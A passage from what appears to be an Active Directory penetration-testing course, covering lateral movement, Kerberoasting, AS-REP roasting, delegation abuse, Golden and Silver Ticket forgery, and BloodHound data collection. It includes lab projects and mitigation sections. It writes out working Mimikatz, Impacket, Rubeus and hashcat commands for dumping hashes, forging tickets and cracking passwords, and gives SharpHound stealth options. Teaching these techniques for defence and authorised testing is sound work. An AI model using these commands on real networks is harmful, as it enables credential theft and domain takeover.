grants the attacker persistent access.\r\n\r\n    **Detection Methods:**\r\n\r\n    *   **SIEM (Security Information and Event Management):**  Analyze logs for suspicious authentication activity, such as multiple failed login attempts, logins from unusual locations, or the use of PtH/PtT techniques.\r\n    *   **Endpoint Detection and Response (EDR):**  Monitor for suspicious processes, file modifications, and network connections.\r\n    *   **Honeypots:**  Deploy honeypot accounts and systems to detect unauthorized access attempts.\r\n    *   **Active Directory Auditing:**  Enable auditing of Active Directory objects to track changes to user accounts, group memberships, and GPOs.\r\n\r\n## Module 4 Project: Lateral Movement in the Lab\r\n\r\n1.  **Compromise a User Account:** Start with a user account that is *not* a domain administrator. This could be a standard user account that you compromised using password spraying (from Module 3).\r\n\r\n2.  **Pass-the-Hash:**\r\n    *   Use `Mimikatz` on the compromised workstation to extract the NTLM hash of the user account.\r\n    *   Identify another system on the network where the user account has access (e.g., a file share, another workstation).\r\n    *   Use `psexec.py` or another PtH tool to execute a command on the target system using the stolen NTLM hash.\r\n    *   Document your steps and the results.\r\n\r\n3.  **Pass-the-Ticket:**\r\n    *   Use `Mimikatz` to extract Kerberos tickets from the compromised workstation.\r\n    *   Identify a service on the network that you want to access using the stolen Kerberos ticket.\r\n    *   Use `Mimikatz` to inject the Kerberos ticket into your current session.\r\n    *   Attempt to access the service.\r\n    *   Document your steps and the results.\r\n\r\n4.  **Impacket Exploration:**\r\n    *   Experiment with `smbexec.py` and `wmiexec.py` to execute commands on remote systems.\r\n    *   Compare the effectiveness of these tools with `psexec.py`.\r\n    *   Document your findings.\r\n\r\n5.  **Extend Your Attack Tool:**\r\n    *   Incorporate Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) functionality into your evolving attack tool (from Module 2 and 3 projects). This should include:\r\n        *   A function to extract NTLM hashes from a file (e.g., a SAM database dump).\r\n        *   A function to execute commands on a remote system using PtH.\r\n        *   A function to inject Kerberos tickets into the current session.\r\n        *   Clear command-line options for each function.\r\n    *   Document the design and implementation of your tool.\r\n\r\n**Deliverables:**\r\n\r\n*   A detailed report documenting your lateral movement activities in the lab environment. Include screenshots, command-line outputs, and explanations of each step.\r\n*   The updated version of your attack tool, including the PtH and PtT functionality.\r\n*   A write-up explaining the design and implementation of your attack tool.\r\n\r\nThis module is designed to be hands-on. Don't be afraid to experiment and try different techniques. The more you practice, the better you'll understand the principles of lateral movement and the more effective you'll be at identifying and exploiting vulnerabilities in Active Directory environments. Good luck!"
    },
    {
      "title": "module_5",
      "description": "module_5 Overview",
      "order": 5,
      "content": "Okay, let's dive deep into Module 5: Domain Compromise. This is where things get *really* interesting. We're going to learn how to leverage the footholds we've established to gain complete control of the Active Directory environment. This module builds heavily on the concepts introduced in previous modules, especially Module 4 (Lateral Movement), so make sure you're comfortable with those topics before proceeding.\r\n\r\n# Module 5: Domain Compromise - Taking Control\r\n\r\n**Module Objective:** Learn and apply techniques to achieve domain compromise, gaining full control of the Active Directory environment.\r\n\r\n## 5.1 Understanding Domain Dominance\r\n\r\nDomain dominance is the ultimate goal of an Active Directory penetration test. It means gaining the ability to control all aspects of the domain, including user accounts, computer accounts, group memberships, Group Policy Objects (GPOs), and trust relationships.  A successful domain compromise allows an attacker to:\r\n\r\n*   **Create and modify user accounts:** Including creating new domain administrators or modifying existing ones.\r\n*   **Deploy malware to all systems within the domain:**  Using GPOs or other deployment mechanisms.\r\n*   **Access sensitive data stored on any system within the domain:** Including databases, file shares, and email servers.\r\n*   **Establish persistent access to the domain:**  Ensuring continued control even after initial detection and remediation efforts.\r\n*   **Potentially pivot to other trusted domains:** If trust relationships exist with other Active Directory forests.\r\n\r\nIn short, domain dominance grants an attacker complete control over the organization's IT infrastructure.\r\n\r\n## 5.2 Kerberoasting\r\n\r\nKerberoasting is a powerful technique for cracking service account passwords. It leverages the Kerberos authentication protocol to request and crack tickets for service accounts.\r\n\r\n### 5.2.1 Understanding Service Principal Names (SPNs)\r\n\r\nA Service Principal Name (SPN) is a unique identifier for a service running on a server. It's used by Kerberos to identify the service when a client requests a ticket. SPNs are registered in Active Directory and associated with a service account.\r\n\r\n*   **Format:** `serviceclass/hostname:port/servicename`\r\n*   **Example:** `MSSQLSvc/sqlserver.example.com:1433`\r\n\r\nCommon service classes include:\r\n\r\n*   `MSSQLSvc`: Microsoft SQL Server\r\n*   `HTTP`: Web servers\r\n*   `HOST`: Generic host service\r\n*   `CIFS`: Common Internet File System (file shares)\r\n\r\nIdentifying SPNs is crucial for Kerberoasting. You can use PowerShell to list SPNs:\r\n\r\n```powershell\r\n# Requires the Active Directory module\r\nImport-Module ActiveDirectory\r\n\r\n# Get all SPNs in the domain\r\nGet-ADObject -Filter {ObjectClass -eq \"user\"} -Properties servicePrincipalName |\r\n  Where-Object {$_.servicePrincipalName -ne $null} |\r\n  Select-Object -Property Name, servicePrincipalName\r\n```\r\n\r\nThis script retrieves all user objects with a `servicePrincipalName` attribute, effectively listing all registered SPNs.\r\n\r\n### 5.2.2 Requesting and Cracking Kerberos Tickets for Service Accounts\r\n\r\nThe Kerberoasting process involves the following steps:\r\n\r\n1.  **Enumerate SPNs:** Identify the SPNs in the domain (as shown above).\r\n2.  **Request Kerberos Tickets (TGS):**  For each SPN, request a Ticket Granting Service (TGS) ticket.  These tickets are encrypted with the service account's password hash.\r\n3.  **Extract the Ticket:** Extract the encrypted TGS ticket from the Kerberos response.\r\n4.  **Crack the Ticket:** Use a password cracking tool like Hashcat or John the Ripper to crack the TGS ticket and recover the service account password.\r\n\r\nHere's how you can do this using PowerShell and `GetUserSPNs.py` from the Impacket library:\r\n\r\n1.  **Install Impacket:**\r\n\r\n    ```bash\r\n    pip3 install impacket\r\n    ```\r\n\r\n2.  **Run `GetUserSPNs.py`:**\r\n\r\n    ```bash\r\n    # Replace with your domain and credentials\r\n    python3 GetUserSPNs.py -dc-ip <domain_controller_ip> <domain>/<username>:<password> -request\r\n    ```\r\n\r\n    This will output the Kerberos tickets in a format suitable for Hashcat.  The `-request` flag tells the script to request the tickets.\r\n\r\n3.  **Crack the Tickets with Hashcat:**\r\n\r\n    ```bash\r\n    hashcat -m 13100 <hash_file> /usr/share/wordlists/rockyou.txt\r\n    ```\r\n\r\n    *   `-m 13100`:  Specifies the Hashcat mode for Kerberos 5 TGS tickets.\r\n    *   `<hash_file>`: The file containing the extracted Kerberos tickets from `GetUserSPNs.py`.\r\n    *   `/usr/share/wordlists/rockyou.txt`:  A common wordlist for password cracking.  You can use other wordlists or rulesets as needed.\r\n\r\nAlternatively, you can use `Rubeus` (a C# tool) for requesting and cracking tickets:\r\n\r\n1.  **Download Rubeus:**  [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)\r\n2.  **Run Rubeus (from a compromised Windows host):**\r\n\r\n    ```powershell\r\n    # Request tickets\r\n    .\\Rubeus.exe kerberoast /domain:<domain> /outfile:tickets.kirbi\r\n\r\n    # Crack tickets (requires Hashcat)\r\n    .\\Rubeus.exe kerberoast /crack:tickets.kirbi /wordlist:/usr/share/wordlists/rockyou.txt\r\n    ```\r\n\r\n### 5.2.3 Mitigation Strategies\r\n\r\n*   **Complex Service Account Passwords:** Enforce strong, unique passwords for all service accounts.  Ideally, these passwords should be randomly generated and at least 20 characters long.\r\n*   **Managed Service Accounts (MSAs) and Group Managed Service Accounts (gMSAs):**  Use MSAs or gMSAs instead of traditional user accounts for services. MSAs and gMSAs automatically manage the service account password, rotating it regularly and securely.  gMSAs are preferred as they can be used across multiple servers.\r\n*   **Account Monitoring:**  Monitor for suspicious Kerberos ticket requests, especially for service accounts.  Look for unusually high volumes of requests or requests from unusual locations.\r\n*   **Regular Password Audits:** Regularly audit service account passwords to ensure they meet complexity requirements.\r\n*   **Principle of Least Privilege:**  Ensure service accounts only have the necessary permissions to perform their intended functions. Avoid granting service accounts unnecessary privileges, such as domain administrator rights.\r\n\r\n## 5.3 AS-REP Roasting\r\n\r\nAS-REP Roasting is another technique for cracking user account passwords. It exploits a misconfiguration where user accounts have the \"Do not require Kerberos preauthentication\" setting enabled.\r\n\r\n### 5.3.1 Identifying Accounts with \"Do Not Require Kerberos Preauthentication\" Enabled\r\n\r\nWhen \"Do not require Kerberos preauthentication\" is enabled, the domain controller will issue a Kerberos Ticket Granting Ticket (TGT) without requiring the client to prove its identity. This TGT is encrypted with the user's password hash, making it vulnerable to offline cracking.\r\n\r\nYou can use PowerShell to identify these accounts:\r\n\r\n```powershell\r\nImport-Module ActiveDirectory\r\n\r\nGet-ADObject -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=4194304)\" -Properties userAccountControl |\r\n    Select-Object Name, userAccountControl\r\n```\r\n\r\nThe LDAP filter `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` identifies user accounts with the `DONT_REQ_PREAUTH` flag set in the `userAccountControl` attribute (value 4194304).\r\n\r\nAlternatively, using `GetNPUsers.py` from Impacket:\r\n\r\n```bash\r\npython3 GetNPUsers.py <domain>/<username>:<password> -dc-ip <domain_controller_ip>\r\n```\r\n\r\nThis script will list all accounts with pre-authentication disabled.\r\n\r\n### 5.3.2 Requesting and Cracking Kerberos Tickets Without Preauthentication\r\n\r\nThe AS-REP Roasting process involves the following steps:\r\n\r\n1.  **Identify Accounts:** Identify user accounts with \"Do not require Kerberos preauthentication\" enabled (as shown above).\r\n2.  **Request Kerberos Tickets (TGT):** For each identified account, request a TGT.\r\n3.  **Extract the Ticket:** Extract the encrypted TGT from the Kerberos response.\r\n4.  **Crack the Ticket:** Use a password cracking tool like Hashcat or John the Ripper to crack the TGT and recover the user account password.\r\n\r\nUsing `GetNPUsers.py` from Impacket (continued from above):\r\n\r\n```bash\r\npython3 GetNPUsers.py <domain>/<username>:<password> -dc-ip <domain_controller_ip> -request\r\n```\r\n\r\nThe `-request` flag tells the script to request the TGTs.  The output will be in a format suitable for Hashcat.\r\n\r\nCracking the TGT with Hashcat:\r\n\r\n```bash\r\nhashcat -m 18200 <hash_file> /usr/share/wordlists/rockyou.txt\r\n```\r\n\r\n*   `-m 18200`: Specifies the Hashcat mode for Kerberos 5 AS-REP.\r\n*   `<hash_file>`: The file containing the extracted Kerberos tickets from `GetNPUsers.py`.\r\n\r\nRubeus can also be used for AS-REP roasting:\r\n\r\n```powershell\r\n.\\Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt\r\nhashcat -m 18200 asrephashes.txt /usr/share/wordlists/rockyou.txt\r\n```\r\n\r\n### 5.3.3 Mitigation Strategies\r\n\r\n*   **Enforce Kerberos Preauthentication:**  The most effective mitigation is to ensure that Kerberos preauthentication is required for all user accounts.  Disable the \"Do not require Kerberos preauthentication\" setting. This can be done through Group Policy:\r\n\r\n    *   Navigate to: `Computer Configuration\\Policies\\Windows Settings\\Security Settings\\Account Policies\\Kerberos Policy`\r\n    *   Set \"Maximum lifetime for service ticket\" to a reasonable value (e.g., 10 hours). This forces clients to re-authenticate more frequently, reducing the window of opportunity for AS-REP roasting.\r\n\r\n*   **Account Monitoring:**  Monitor for suspicious Kerberos TGT requests, especially for accounts with preauthentication disabled.\r\n*   **Strong Passwords:**  Encourage users to use strong, unique passwords.  Implement password policies that enforce complexity requirements and prevent the use of common passwords.\r\n*   **Regular Password Audits:** Regularly audit user account passwords to ensure they meet complexity requirements.\r\n\r\n## 5.4 Delegation Attacks (Constrained and Unconstrained Delegation)\r\n\r\nKerberos delegation allows a service to act on behalf of a user when accessing other services. However, misconfigured delegation settings can be exploited to gain unauthorized access. There are two main types of Kerberos delegation:\r\n\r\n### 5.4.1 Unconstrained Delegation\r\n\r\nUnconstrained delegation is the older and less secure form of delegation. When unconstrained delegation is enabled for a service, the service can request a TGT on behalf of *any* user. This TGT can then be used to impersonate the user and access *any* service on the domain.\r\n\r\n**Vulnerability:** If a server with unconstrained delegation is compromised, an attacker can steal the TGTs of users who authenticate to that server.  This allows the attacker to impersonate those users and gain access to any resource they have access to, including domain administrator accounts.\r\n\r\n**Detection:**  Identify computers with unconstrained delegation enabled.  You can use PowerShell:\r\n\r\n```powershell\r\nImport-Module ActiveDirectory\r\n\r\nGet-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation |\r\n    Select-Object Name, TrustedForDelegation\r\n```\r\n\r\n**Mitigation:**\r\n\r\n*   **Avoid Unconstrained Delegation:**  Unconstrained delegation should be avoided whenever possible. It is inherently insecure and should only be used as a last resort.\r\n*   **Transition to Constrained Delegation:**  Migrate services to constrained delegation or resource-based constrained delegation.\r\n*   **Monitor for Suspicious Activity:**  Monitor servers with unconstrained delegation enabled for suspicious activity, such as unauthorized access attempts.\r\n\r\n### 5.4.2 Constrained Delegation\r\n\r\nConstrained delegation is a more secure form of delegation that limits the services a service can access on behalf of a user. With constrained delegation, you specify the services that the service is allowed to access.\r\n\r\n**Types of Constrained Delegation:**\r\n\r\n*   **Constrained Delegation (Traditional):**  The service account is configured to trust specific services on other servers. The service can only request tickets for those specific services.\r\n*   **Resource-Based Constrained Delegation (RBCD):**  The resource (the service being accessed) is configured to trust specific service accounts.  This allows you to control delegation from the resource side.  RBCD is generally preferred as it gives the resource owner more control over who can access it.\r\n\r\n**Vulnerability:**  While more secure than unconstrained delegation, constrained delegation can still be vulnerable if misconfigured.  For example, if a service is granted delegation rights to a highly privileged service (e.g., a service running as SYSTEM), an attacker could potentially leverage that delegation to gain elevated privileges.\r\n\r\n**Exploitation:**\r\n\r\n*   **Abusing Constrained Delegation:** If you control a computer that has constrained delegation configured to another service, you can potentially abuse that delegation to impersonate users and access the target service.\r\n*   **Shadow Credentials:**  This involves adding a new credential to the target service account and then using that credential to authenticate to the target service.\r\n\r\n**Detection:**\r\n\r\n*   **Identify Constrained Delegation Settings:** Use PowerShell to identify constrained delegation settings:\r\n\r\n    ```powershell\r\n    Import-Module ActiveDirectory\r\n\r\n    Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like \"*\"} -Properties msDS-AllowedToDelegateTo |\r\n        Select-Object Name, msDS-AllowedToDelegateTo\r\n    ```\r\n\r\n    This script retrieves all computers with constrained delegation configured.\r\n\r\n*   **BloodHound:**  BloodHound is an excellent tool for visualizing and identifying delegation attack paths.\r\n\r\n**Mitigation:**\r\n\r\n*   **Principle of Least Privilege:**  Grant delegation rights only to the services that absolutely require them. Avoid granting delegation rights to highly privileged services.\r\n*   **Regular Audits:**  Regularly audit delegation settings to ensure they are configured correctly and that no unnecessary delegation rights have been granted.\r\n*   **Monitor for Suspicious Activity:**  Monitor for suspicious activity related to delegated accounts, such as unauthorized access attempts.\r\n*   **Implement Tiering:** Implement a tiered administrative model to restrict access to privileged accounts and systems.\r\n\r\n**Tools for Delegation Attacks:**\r\n\r\n*   **Rubeus:**  A versatile C# tool for Kerberos attacks, including delegation attacks.\r\n*   **PowerView:**  A PowerShell tool for Active Directory enumeration and exploitation.\r\n*   **BloodHound:**  For visualizing and identifying delegation attack paths.\r\n\r\n## 5.5 Golden Ticket Attacks\r\n\r\nA Golden Ticket attack allows an attacker to forge a Kerberos Ticket Granting Ticket (TGT) for the `krbtgt` account. The `krbtgt` account is used to encrypt all Kerberos TGTs.  By forging a TGT for this account, an attacker can create tickets that are valid for *any* user and *any* service in the domain, effectively granting them complete control of the domain.\r\n\r\n**Prerequisites:**\r\n\r\n*   Compromised `krbtgt` account password hash. This typically requires domain administrator privileges.\r\n\r\n**Steps:**\r\n\r\n1.  **Obtain the `krbtgt` Hash:**  Use `Mimikatz` to extract the `krbtgt` hash from a domain controller:\r\n\r\n    ```powershell\r\n    # Run Mimikatz as a domain administrator\r\n    privilege::debug\r\n    lsadump::dcsync /domain:<domain_name> /user:krbtgt\r\n    ```\r\n\r\n    This will output the NTLM hash of the `krbtgt` account.\r\n\r\n2.  **Forge the Golden Ticket:**  Use `Mimikatz` to forge the Golden Ticket:\r\n\r\n    ```powershell\r\n    kerberos::golden /domain:<domain_name> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /user:<username> /id:500\r\n    ```\r\n\r\n    *   `<domain_name>`: The name of the domain.\r\n    *   `<domain_sid>`: The SID of the domain.\r\n    *   `<krbtgt_hash>`: The NTLM hash of the `krbtgt` account.\r\n    *   `<username>`: The username for which to create the Golden Ticket (e.g., `administrator`).\r\n    *   `/id:500`:  Sets the RID (Relative ID) to 500, which is the RID for the built-in Administrator account.\r\n\r\n3.  **Import the Ticket:**  Import the forged Golden Ticket into the current Kerberos session:\r\n\r\n    ```powershell\r\n    kerberos::ptt <ticket_file>\r\n    ```\r\n\r\n    Where `<ticket_file>` is the file containing the forged ticket.\r\n\r\n4.  **Verify Domain Administrator Access:**  You should now have domain administrator privileges.  You can verify this by attempting to access a domain controller using `psexec`:\r\n\r\n    ```powershell\r\n    psexec \\\\<domain_controller_ip> cmd.exe\r\n    ```\r\n\r\n**Mitigation:**\r\n\r\n*   **Protect the `krbtgt` Account:** The `krbtgt` account is the most important account in the domain.  It should be protected with extreme care.\r\n*   **Regularly Rotate the `krbtgt` Password:**  Rotating the `krbtgt` password invalidates all existing Golden Tickets.  Microsoft recommends rotating the `krbtgt` password at least twice a year.  This is a complex and potentially disruptive process, so it should be planned carefully.  Use the `Reset-KrbTgtKey` cmdlet.  **Caution: Ensure you fully understand the implications and follow Microsoft's documentation carefully before rotating the `krbtgt` password.**\r\n*   **Monitor for Golden Ticket Attacks:**  Monitor for suspicious Kerberos activity, such as TGT requests for the `krbtgt` account or TGT requests with unusual characteristics.\r\n*   **Implement Tiering:** Implement a tiered administrative model to restrict access to domain controllers.\r\n*   **Credential Guard:**  Credential Guard helps protect NTLM and Kerberos secrets by isolating them in a virtualized environment.\r\n\r\n## 5.6 Silver Ticket Attacks\r\n\r\nA Silver Ticket attack allows an attacker to forge a Kerberos service ticket to access a specific service.  Unlike a Golden Ticket attack, a Silver Ticket attack only grants access to a single service.  However, if that service has elevated privileges, a Silver Ticket attack can still be very damaging.\r\n\r\n**Prerequisites:**\r\n\r\n*   Compromised service account password hash.\r\n*   Knowledge of the SPN for the target service.\r\n\r\n**Steps:**\r\n\r\n1.  **Obtain the Service Account Hash:**  Use `Mimikatz` to extract the service account hash from the target server:\r\n\r\n    ```powershell\r\n    # Run Mimikatz on the target server as an administrator\r\n    privilege::debug\r\n    lsadump::lsa /name:<service_account_name> /patch\r\n    ```\r\n\r\n    This will output the NTLM hash of the service account.\r\n\r\n2.  **Forge the Silver Ticket:**  Use `Mimikatz` to forge the Silver Ticket:\r\n\r\n    ```powershell\r\n    kerberos::golden /domain:<domain_name> /sid:<domain_sid> /target:<target_server> /service:<service_name> /id:500 /krbtgt:<service_account_hash>\r\n    ```\r\n\r\n    *   `<domain_name>`: The name of the domain.\r\n    *   `<domain_sid>`: The SID of the domain.\r\n    *   `<target_server>`: The hostname of the target server.\r\n    *   `<service_name>`: The SPN of the target service (e.g., `cifs`).\r\n    *   `/id:500`:  Sets the RID (Relative ID) to 500, which is the RID for the built-in Administrator account (for local admin access on the target machine).\r\n    *   `<service_account_hash>`: The NTLM hash of the service account.\r\n\r\n3.  **Import the Ticket:**  Import the forged Silver Ticket into the current Kerberos session:\r\n\r\n    ```powershell\r\n    kerberos::ptt <ticket_file>\r\n    ```\r\n\r\n    Where `<ticket_file>` is the file containing the forged ticket.\r\n\r\n4.  **Access the Service:**  You should now have access to the target service.  For example, if you forged a Silver Ticket for the CIFS service, you can access the target server's file shares:\r\n\r\n    ```powershell\r\n    dir \\\\<target_server>\\c$\r\n    ```\r\n\r\n**Mitigation:**\r\n\r\n*   **Protect Service Account Passwords:**  Enforce strong, unique passwords for all service accounts.\r\n*   **Managed Service Accounts (MSAs) and Group Managed Service Accounts (gMSAs):**  Use MSAs or gMSAs instead of traditional user accounts for services.\r\n*   **Monitor for Silver Ticket Attacks:**  Monitor for suspicious Kerberos activity, such as service ticket requests with unusual characteristics.\r\n*   **Implement Tiering:** Implement a tiered administrative model to restrict access to privileged accounts and systems.\r\n*   **LSA Protection:** Enable LSA Protection to prevent `lsass.exe` from being accessed by unauthorized processes.\r\n\r\n## 5.7 Case Study: Analyzing Real-World Domain Compromise Scenarios and Their Impact\r\n\r\nLet's consider a hypothetical, but realistic, scenario:\r\n\r\n**Scenario:**  A company, \"Example Corp,\" suffers a data breach.  The attackers gained initial access through a phishing email that compromised a low-level user account.\r\n\r\n**Attack Path:**\r\n\r\n1.  **Initial Access:** Phishing email leads to a compromised user account on a workstation.\r\n2.  **Enumeration:**  The attacker uses `BloodHound` to map the Active Directory environment and identifies a server with unconstrained delegation enabled (ServerA).\r\n3.  **Lateral Movement:**  The attacker waits for a domain administrator to log onto ServerA.  The attacker then steals the domain administrator's TGT from ServerA's memory.\r\n4.  **Domain Compromise:**  Using the stolen TGT, the attacker impersonates the domain administrator and gains full control of the domain.\r\n5.  **Data Exfiltration:** The attacker accesses sensitive data stored on file shares and databases and exfiltrates it to an external server.\r\n\r\n**Impact:**\r\n\r\n*   **Data Breach:** Sensitive data is stolen and potentially exposed.\r\n*   **Reputational Damage:**  The company's reputation is damaged due to the data breach.\r\n*   **Financial Loss:**  The company incurs costs related to incident response, legal fees, and regulatory fines.\r\n*   **Business Disruption:**  The company's operations are disrupted due to the data breach.\r\n\r\n**Lessons Learned:**\r\n\r\n*   **Importance of User Awareness Training:**  Users need to be trained to recognize and avoid phishing emails.\r\n*   **Risk of Unconstrained Delegation:**  Unconstrained delegation should be avoided whenever possible.\r\n*   **Importance of Monitoring:**  Organizations need to monitor their Active Directory environments for suspicious activity.\r\n*   **Need for Strong Security Controls:**  Organizations need to implement strong security controls, such as multi-factor authentication and regular security audits.\r\n\r\n## Module 5 Project: Domain Compromise in the Lab\r\n\r\nIn your lab environment, perform the following tasks:\r\n\r\n1.  **Kerberoasting:** Identify SPNs, request Kerberos tickets, and crack the tickets to obtain service account credentials.\r\n2.  **AS-REP Roasting:** Identify accounts with \"Do not require Kerberos preauthentication\" enabled, request Kerberos tickets, and crack the tickets to obtain user account credentials.\r\n3.  **Delegation Attacks:** Identify servers with unconstrained and constrained delegation enabled. Attempt to exploit these delegation settings to gain elevated privileges.\r\n4.  **Golden Ticket Attack:** Obtain the `krbtgt` hash and forge a Golden Ticket to gain domain administrator privileges.\r\n5.  **Silver Ticket Attack:** Obtain a service account hash and forge a Silver Ticket to access a specific service.\r\n\r\nDocument all steps taken, including commands used, output generated, and any challenges encountered.  Analyze the effectiveness of each technique and identify potential mitigation strategies.\r\n\r\nThis module provides a solid foundation for understanding and executing domain compromise techniques. Remember to practice these techniques in a safe and ethical lab environment. Good luck!"
    },
    {
      "title": "module_6",
      "description": "module_6 Overview",
      "order": 6,
      "content": "Alright! Let's dive deep into Module 6: Advanced AD Exploitation with BloodHound. I'm excited to share this with you because BloodHound is a game-changer for understanding and exploiting Active Directory environments. This module will be packed with hands-on exercises and real-world examples.\r\n\r\n---\r\n\r\n**Module 6: Advanced AD Exploitation with BloodHound**\r\n\r\n**Module Objective:** Learn to use BloodHound for attack path mapping and identify complex attack vectors within the Active Directory environment.\r\n\r\n---\r\n\r\n**Subtopic 1: Introduction to BloodHound**\r\n\r\n*   **What is BloodHound?**\r\n\r\n    BloodHound is a powerful open-source Active Directory attack path mapping tool. It uses graph theory to visualize complex relationships within AD and identify the shortest paths to privileged accounts, like Domain Admin.  It's not just about finding vulnerabilities; it's about understanding how vulnerabilities connect to enable a full domain compromise.\r\n\r\n*   **Why is BloodHound Important?**\r\n\r\n    *   **Complexity:**  Active Directory environments can be incredibly complex, with intricate group memberships, access control lists (ACLs), and delegation settings.  Humans can't easily track all these relationships.\r\n    *   **Hidden Attack Paths:**  BloodHound reveals attack paths that are difficult to identify manually, allowing attackers to exploit unexpected vulnerabilities.\r\n    *   **Prioritization:** BloodHound helps prioritize remediation efforts by highlighting the most critical vulnerabilities that lead to domain compromise.\r\n    *   **Defensive Planning:**  Understanding attack paths allows defenders to proactively harden their environment and break those paths.\r\n\r\n*   **Key Components:**\r\n\r\n    *   **SharpHound (Data Collector):**  Gathers data from the Active Directory environment.  Think of it as the \"eyes and ears\" of BloodHound.  It can be run from a compromised workstation or a domain-joined machine.\r\n    *   **BloodHound GUI (Neo4j):** The graphical interface where you visualize and analyze the collected data. It uses a Neo4j graph database to store and query the information.\r\n    *   **Neo4j (Graph Database):** The underlying database that stores the collected data and allows for efficient relationship analysis.\r\n\r\n---\r\n\r\n**Subtopic 2: BloodHound Data Collection**\r\n\r\n*   **SharpHound: The BloodHound Data Collector**\r\n\r\n    SharpHound is the recommended data collector because it's written in C# and is generally faster and more efficient than the older PowerShell-based collectors.\r\n\r\n*   **Data Collection Methods:**\r\n\r\n    *   **PowerShell (Legacy):**  While still functional, the PowerShell collector is slower and less efficient than SharpHound.  We will focus on SharpHound.\r\n    *   **C# (SharpHound):**  The preferred method.  It's compiled, runs faster, and offers more flexibility.\r\n\r\n*   **Downloading SharpHound:**\r\n\r\n    You can download the latest version of SharpHound from the BloodHound GitHub repository:  [https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound)  Download the `SharpHound.exe` file.\r\n\r\n*   **Running SharpHound:**\r\n\r\n    You need to run SharpHound from a domain-joined machine or a machine with valid domain credentials.  Ideally, you'd run it from a compromised workstation within your lab environment.\r\n\r\n    1.  **Copy `SharpHound.exe` to your target machine.**\r\n    2.  **Open a command prompt or PowerShell window as a standard user (or the compromised user).**\r\n    3.  **Run SharpHound with basic options:**\r\n\r\n        ```powershell\r\n        SharpHound.exe -c All\r\n        ```\r\n\r\n        This command tells SharpHound to collect all available data.\r\n\r\n*   **SharpHound Options:**\r\n\r\n    *   `-c <Collector>`: Specifies the type of data to collect. Common collectors:\r\n        *   `All`:  Collects all available data (users, groups, computers, sessions, trusts, GPOs, etc.). This is the most comprehensive option.\r\n        *   `UserOnly`: Collects only user data.\r\n        *   `GroupOnly`: Collects only group data.\r\n        *   `ComputerOnly`: Collects only computer data.\r\n        *   `Session`: Collects session information (who is logged in where).  Requires elevated privileges on the target machines.\r\n        *   `Trusts`: Collects trust relationships between domains.\r\n        *   `GPO`: Collects Group Policy Object information.\r\n        *   `ACL`: Collects Access Control List information.\r\n    *   `-d <Domain>`: Specifies the domain to collect data from.  If omitted, SharpHound will attempt to discover the domain automatically.\r\n    *   `-u <Username>`: Specifies a username to use for authentication.\r\n    *   `-p <Password>`: Specifies a password to use for authentication.\r\n    *   `-gc <DomainController>`: Specifies a specific Global Catalog server to use. This can be helpful in large or multi-domain environments.\r\n    *   `-ns <NameServer>`: Specifies a DNS server to use for resolving domain names.\r\n    *   `-o <OutputDirectory>`: Specifies the directory where the collected data will be saved (as `.json` files). If omitted, it will save to the current directory.\r\n    *    `-ExcludeDCs`: Excludes Domain Controllers from session collection. Useful in very large environments where querying DCs for session data can cause issues.\r\n    *   `-Stealth`: Uses a stealthy collection method that avoids some common detection techniques (slower).\r\n    *   `-Delay <Milliseconds>`: Adds a delay between requests to avoid overwhelming the target systems.\r\n\r\n*   **Example: Collecting Data with Specific Credentials:**\r\n\r\n    ```powershell\r\n    SharpHound.exe -c All -u \"compromised_user\" -p \"password123\" -d \"example.local\" -o \"C:\\BloodHoundData\"\r\n    ```\r\n\r\n*   **Output Files:**\r\n\r\n    SharpHound will generate several `.json` files in the specified output directory (or the current directory if `-o` is omitted). These files contain the collected data:\r\n\r\n    *   `computers.json`\r\n    *   `domains.json`\r\n    *   `groups.json`\r\n    *   `users.json`\r\n    *   `sessions.json` (if the Session collector was used)\r\n    *   `trusts.json` (if the Trusts collector was used)\r\n    *   `gpos.json` (if the GPO collector was used)\r\n    *   `acls.json` (if the ACL collector was used)\r\n\r\n*   **Optimizing Data Collection for Large Environments:**\r\n\r\n    *   **Targeted Collection:** Instead of collecting all data at once, start with specific collectors (e.g., `UserOnly`, `GroupOnly`) to reduce the initial load.\r\n    *   **Domain Controller Exclusion:** Use the `-ExcludeDCs` flag to avoid querying domain controllers for session information.\r\n    *   **Global Catalog Specification:**  Use the `-gc` flag to target a specific Global Catalog server.\r\n    *   **Delay:** Use the `-Delay` flag to add a delay between requests.\r\n    *   **Stealth Mode:** Use the `-Stealth` flag to reduce the chances of detection.\r\n\r\n---\r\n\r\n**Subtopic 3: BloodHound Analysis**\r\n\r\n*   **Installing Neo4j:**\r\n\r\n    BloodHound uses the Neo4j graph database. You need to install Neo4j on your analysis machine (the machine where you'll run the BloodHound GUI).\r\n\r\n    1.  **Download Neo4j:**  Download the Neo4j Desktop version from the Neo4j website: [https://neo4j.com/download-center/](https://neo4j.com/download-center/)\r\n    2.  **Install Neo4j Desktop:** Follow the installation instructions for your operating system.\r\n    3.  **Create a Database:**  Open Neo4j Desktop and create a new database.  Choose a password (remember this password!).  Start the database.\r\n\r\n*   **Installing BloodHound GUI:**\r\n\r\n    You can download the BloodHound GUI from the BloodHound GitHub repository: [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)  Download the appropriate version for your operating system.\r\n\r\n*   **Connecting BloodHound to Neo4j:**\r\n\r\n    1.  **Open the BloodHound GUI.**\r\n    2.  **Enter the Neo4j connection details:**\r\n        *   **URI:** `bolt://localhost:7687`\r\n        *   **Username:** `neo4j`\r\n        *   **Password:** The password you set when creating the Neo4j database.\r\n    3.  **Click \"Upload Data\" and select the `.json` files that SharpHound generated.**  You can select multiple files at once.\r\n\r\n*   **Understanding the BloodHound Graph Database:**\r\n\r\n    BloodHound represents Active Directory objects (users, groups, computers, domains, GPOs) as *nodes* in a graph.  Relationships between these objects (e.g., user belongs to group, computer is managed by GPO) are represented as *edges* connecting the nodes.\r\n\r\n*   **Basic BloodHound Queries:**\r\n\r\n    BloodHound provides a query language based on Cypher (Neo4j's query language).  However, BloodHound also provides several built-in queries that make common tasks easier.  Here are some examples:\r\n\r\n    *   **\"Find shortest paths to Domain Admins\":**  This is the most common and 